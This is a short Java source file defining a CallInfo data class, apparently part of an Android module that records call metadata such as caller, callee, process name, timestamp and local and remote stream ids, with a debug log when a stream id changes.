package com.android.deviceinfo.module.chat;

import java.util.Date;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;

public class CallInfo {
	private static final String TAG = "CallInfo";
	
	public int id;
	public String account;
	public String peer;
	public String displayName;
	public boolean incoming;
	public boolean valid;
	public String processName;
	public int programId;
	public Date timestamp;
	public boolean delay;
	public boolean heuristic;
	private long[] streamId = new long[2];

	public String getCaller() {
		if (!incoming) {
			return account;
		}
		return peer;
	}

	public String getCallee() {
		if (incoming) {
			return account;
		}
		return peer;
	}

	public boolean setStreamId(boolean remote, long streamId) {

		int pos = remote? 1 : 0 ;
		if (streamId != this.streamId[pos]) {
			
			if (this.streamId[pos] != 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStreamId): Wrong streamId: " + this.streamId[pos] + " <- " + streamId +" "+ (remote? "remote" : "local"));
				}
				this.streamId[pos] = streamId;
				return false;
			}
			
			this.streamId[pos] = streamId;
		}
		
		return true;
	}

}
